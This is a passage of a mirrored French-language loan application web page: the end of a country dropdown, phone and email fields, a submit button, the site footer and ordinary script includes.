                                                        Syrian Arab Republic </option>
                                                    <option value="Taiwan, Province of China" data-calc-value="Taiwan, Province of China">
                                                        Taiwan, Province of China </option>
                                                    <option value="Tajikistan" data-calc-value="Tajikistan">
                                                        Tajikistan </option>
                                                    <option value="Tanzania, United Republic of" data-calc-value="Tanzania, United Republic of">
                                                        Tanzania, United Republic of </option>
                                                    <option value="Thailand" data-calc-value="Thailand">
                                                        Thailand </option>
                                                    <option value="Timor-Leste" data-calc-value="Timor-Leste">
                                                        Timor-Leste </option>
                                                    <option value="Togo" data-calc-value="Togo">
                                                        Togo </option>
                                                    <option value="Tokelau" data-calc-value="Tokelau">
                                                        Tokelau </option>
                                                    <option value="Tonga" data-calc-value="Tonga">
                                                        Tonga </option>
                                                    <option value="Trinidad and Tobago" data-calc-value="Trinidad and Tobago">
                                                        Trinidad and Tobago </option>
                                                    <option value="Tunisia" data-calc-value="Tunisia">
                                                        Tunisia </option>
                                                    <option value="Turkey" data-calc-value="Turkey">
                                                        Turkey </option>
                                                    <option value="Turkmenistan" data-calc-value="Turkmenistan">
                                                        Turkmenistan </option>
                                                    <option value="Turks and Caicos Islands" data-calc-value="Turks and Caicos Islands">
                                                        Turks and Caicos Islands </option>
                                                    <option value="Tuvalu" data-calc-value="Tuvalu">
                                                        Tuvalu </option>
                                                    <option value="Uganda" data-calc-value="Uganda">
                                                        Uganda </option>
                                                    <option value="Ukraine" data-calc-value="Ukraine">
                                                        Ukraine </option>
                                                    <option value="United Arab Emirates" data-calc-value="United Arab Emirates">
                                                        United Arab Emirates </option>
                                                    <option value="United Kingdom" data-calc-value="United Kingdom">
                                                        United Kingdom </option>
                                                    <option value="United States" data-calc-value="United States">
                                                        United States </option>
                                                    <option value="United States Minor Outlying Islands" data-calc-value="United States Minor Outlying Islands">
                                                        United States Minor Outlying Islands </option>
                                                    <option value="Uruguay" data-calc-value="Uruguay">
                                                        Uruguay </option>
                                                    <option value="Uzbekistan" data-calc-value="Uzbekistan">
                                                        Uzbekistan </option>
                                                    <option value="Vanuatu" data-calc-value="Vanuatu">
                                                        Vanuatu </option>
                                                    <option value="Venezuela, Bolivarian Republic of" data-calc-value="Venezuela, Bolivarian Republic of">
                                                        Venezuela, Bolivarian Republic of </option>
                                                    <option value="Viet Nam" data-calc-value="Viet Nam">
                                                        Viet Nam </option>
                                                    <option value="Virgin Islands, British" data-calc-value="Virgin Islands, British">
                                                        Virgin Islands, British </option>
                                                    <option value="Virgin Islands, U.S." data-calc-value="Virgin Islands, U.S.">
                                                        Virgin Islands, U.S. </option>
                                                    <option value="Wallis and Futuna" data-calc-value="Wallis and Futuna">
                                                        Wallis and Futuna </option>
                                                    <option value="Western Sahara" data-calc-value="Western Sahara">
                                                        Western Sahara </option>
                                                    <option value="Yemen" data-calc-value="Yemen">
                                                        Yemen </option>
                                                    <option value="Zambia" data-calc-value="Zambia">
                                                        Zambia </option>
                                                    <option value="Zimbabwe" data-calc-value="Zimbabwe">
                                                        Zimbabwe </option>
                                                </select>

                                            </div>
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="form-group">
                                                <label>Téléphone mobile <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="tel" name="telephone" class="form-control border" maxlength="20" autocomplete="off" required>
                                            </div>
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="form-group">
                                                <label>Adresse E-mail <abbr><i style="color:red;font-size:20px;">*</i></abbr></label>
                                                <input type="email" name="email" class="form-control border" maxlength="50" autocomplete="off" required>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                                <div class="col-lg-12">
                                    <div id="order_review" class="checkout-review-order">
                                        <div id="payment" class="checkout-payment">
                                            <div class="checkout-form place-order clearfix">
                                                <button type="submit" name="pret" class="button ttm-btn ttm-btn-size-sm ttm-btn-bgcolor-darkgrey pull-right">Soumettre ma demande</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div><!-- row end -->
                </div>
            </div>
            <!-- sidebar end -->

        </div>
        <!--site-main end-->

        <!--footer start-->
        <footer class="footer widget-footer clearfix">
            <div class="second-footer ttm-textcolor-white bg-img2">
                <div class="container">
                    <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget widget_text clearfix">
                                <div class="footer-logo">
                                    <img src="images/logo.png" alt="footer-logo">
                                </div>
                                <div style="margin-top:45px;">
                                    <h6 class="mb-20">Nous Suivre sur</h6>
                                    <div class="social-icons circle social-hover">
                                        <ul class="list-inline">
                                            <li class="social-facebook"><a class="tooltip-top" target="_blank" href="#" data-tooltip="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
                                            <li class="social-twitter"><a class="tooltip-top" target="_blank" href="#" data-tooltip="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
                                            <li class="social-flickr"><a class=" tooltip-top" target="_blank" href="#" data-tooltip="flickr"><i class="fa fa-flickr" aria-hidden="true"></i></a></li>
                                            <li class="social-linkedin"><a class=" tooltip-top" target="_blank" href="#" data-tooltip="LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget link-widget clearfix">
                                <h3 class="widget-title">Nos Liens</h3>
                                <ul id="menu-footer-services">
                                    <li><a href="index.html">Accueil</a></li>
                                    <li><a href="presentation.html">Qui sommes nous ?</a></li>
                                    <li><a href="nos_services.html">Nos Services</a></li>
                                    <li><a href="obtenir_credit.php">Obtenir un prêt</a></li>
                                    <li><a href="nous_contacter.php">Nous contacter</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget link-widget clearfix">
                                <h3 class="widget-title">Notre Adresse</h3>
                                <ul id="menu-footer-services" style="font-weight:500;">

                                    <li><i class="fa fa-phone"></i>&nbsp; 00000000000</li>
                                    <li><i class="fa fa-envelope-o"></i>&nbsp; <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="95f6fafbe1f4f6e1d5f6f9f6f7f7f9f9b8f7fbfebbf6faf8">[email&#160;protected]</a></li>
                                    <li><i class="fa fa-laptop"></i>&nbsp; www.clcbbll-bnk.com</li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-3 widget-area">
                            <div class="widget flicker_widget clearfix">
                                <h3 class="widget-title">NewsLetter</h3>
                                <div class="textwidget widget-text">
                                    Inscrivez-vous dès aujourd'hui pour obtenir nos dernières nouvelles. <form id="subscribe-form" class="newsletter-form" method="post" action="#" data-mailchimp="true">
                                        <div class="mailchimp-inputbox clearfix" id="subscribe-content">
                                            <i class="fa fa-envelope"></i>
                                            <input type="email" name="email" placeholder="Adresse E-mail" required="">
                                            <input type="submit" value="">
                                        </div>
                                        <div id="subscribe-msg"></div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bottom-footer-text ttm-bgcolor-darkgrey ttm-textcolor-white">
                <div class="container">
                    <div class="row copyright">
                        <div class="col-md-6">
                            <div class="">
                                <span>Copyright © 2015&nbsp;<a href="#">BLCL</a></span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="text-md-right res-767-mt-10">
                                <div class="d-lg-inline-flex">
                                    <ul id="menu-footer-menu" class="footer-nav-menu">
                                        <li><a href="#">Mention légale</a></li>
                                        <li><a href="#">Politique de confidentialité</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!--footer end-->

        <!--back-to-top start-->

        <!--back-to-top end-->

    </div><!-- page end -->

    <!-- Javascript -->

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/plugins.js"></script>
    <script src="js/tether.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/jquery.easing.js"></script>
    <script src="js/jquery-waypoints.js"></script>
    <script src="js/jquery-validate.js"></script>
    <script src="js/owl.carousel.js"></script>
    <script src="js/jquery.prettyPhoto.js"></script>
    <script src="js/numinate.min69596959.js?ver=4.9.3"></script>
    <script src="js/lazysizes.min.js"></script>
    <script src="js/main.js"></script>

    <!-- Javascript end-->

</body>

<!-- Mirrored from www.clcbbll-bnk.com/obtenir_credit.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 10 Mar 2021 20:30:08 GMT -->

</html>